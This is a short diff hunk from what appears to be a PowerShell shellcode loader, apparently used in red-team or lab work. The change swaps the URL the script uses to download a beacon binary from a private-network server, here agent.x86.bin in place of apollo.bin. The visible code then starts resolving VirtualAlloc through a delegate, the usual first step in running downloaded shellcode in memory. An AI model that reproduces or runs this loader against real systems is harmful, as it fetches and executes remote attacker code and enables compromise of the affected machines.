@@ -39,7 +39,7 @@ function getDelegateType {
 }
 
 # Download shellcode
-$Shellcode = (New-Object System.Net.WebClient).DownloadData("http://192.168.235.130:8000/beacons/apollo.bin")
+$Shellcode = (New-Object System.Net.WebClient).DownloadData("http://192.168.45.175:8000/beacons/agent.x86.bin")
 
 # VirtualAlloc
 $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
